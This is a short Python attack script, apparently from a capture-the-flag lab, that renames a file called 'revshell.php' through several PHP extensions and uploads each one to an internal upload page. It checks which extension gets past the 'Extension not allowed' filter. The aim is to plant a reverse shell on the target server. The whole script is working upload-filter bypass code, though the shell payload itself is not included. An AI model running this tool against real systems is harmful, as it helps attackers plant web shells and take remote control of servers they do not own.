import requests
import os

ip = "10.10.195.251"
url = "http://"+ip+":3333/internal/index.php"

old_filename = "revshell.php"

filename = "revshell"
extensions = [
	".php",
	".php3",
	".php4",
	".php5",
	".phtml",
]

for ext in extensions:
	new_filename = filename + ext
	os.rename(old_filename, new_filename)

	files = {"file": open(new_filename, "rb")}
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print(ext + " not allowed")
	else:
		print(ext + " SEEMS TO BE ALLOWED??")

	old_filename = new_filename

	
